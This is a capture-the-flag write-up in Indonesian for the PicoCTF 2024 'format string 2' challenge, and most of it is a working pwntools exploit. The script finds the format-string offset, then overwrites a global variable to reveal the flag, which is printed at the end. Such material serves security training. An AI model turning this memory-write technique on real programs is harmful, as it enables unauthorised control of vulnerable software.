# PicoCTF2024-Format-string-2-writeup

# analysis & exploit step by step

- menjalankan program
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(format-string-2)
└> ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
okokko%p
Here's your input: okokko0x7ffd738e23a0
sus = 0x21737573
You can do better!
```

program memiliki kerentanan format string. dan memberi tahu value dari sus = 0x21737573. 


setelah mendecompile program ini di ghidra ternyata kita harus merubah value dari sus untuk mendapatkan flag :

```C
  if (sus == 0x67616c66) {
    puts("I have NO clue how you did that, you must be a wizard. Here you go...");
    local_10 = fopen("flag.txt","r");
```

data :
- sus = 0x21737573
- value target = 0x67616c66

untuk merubah value sus. perlu bantuan fungsi fmtstr_payload dari pwntools. 

```Python
from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./vuln")
load = {elf.sym.sus:0x67616c66}

def start():
    if args.LOCAL:
        print("[+] local process..")
        p = process("./vuln")
    else:
        try:
            SERV = "rhea.picoctf.net"
            PORT = 49754
            p = remote(SERV,PORT)
            print("[+] remoting server..")
        except:
            print("[!] error trying remote. using local instead..")
            p = process("./vuln")
    return p 

def index():
    i = 0
    while True:
        i += 1
        payload = f"AAAAAAAA%{i}$p"
        p = process("./vuln")
        p.sendlineafter(b"say?",payload.encode())
        p.recvuntil(b'AAAAAAAA')
        leak = p.recvline()
        if b"414141" in leak:
            print(f"\nFound at index {i} : {leak.decode()}")
            p.close()
            break
        p.close()
        # index = 14
    return i


index = index() #index = 14 #pake untuk kode yg ngebut

p = start()
payload = fmtstr_payload(index,load,write_size='byte')
p.sendlineafter(b"say?",payload)

for _ in range(3):
    print(p.recvline())
print(p.recv().decode())
p.close()

```
<p align= "center"> <img width="1233" height="424" alt="image" src="https://github.com/user-attachments/assets/e3376242-5987-4d70-8e2b-d61dd6dbc41e" />
 </p>

 done 
 flag = `picoCTF{f0rm47_57r?_f0rm47_m3m_5161a699}`
